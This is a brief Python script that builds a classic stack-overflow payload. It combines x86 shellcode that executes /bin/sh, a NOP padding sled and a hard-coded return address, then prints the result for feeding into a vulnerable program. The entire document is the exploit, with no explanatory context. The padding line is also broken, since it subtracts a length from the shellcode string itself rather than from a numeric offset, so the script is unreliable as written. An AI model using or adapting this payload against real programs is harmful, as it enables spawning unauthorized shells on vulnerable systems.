import struct

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

padding = "\x90" * (shellcode - len(shellcode))
shellcode_addr = struct.pack("I", 0x804a040)

payload = ""
payload += shellcode
payload += padding
payload += shellcode_addr



print (payload)
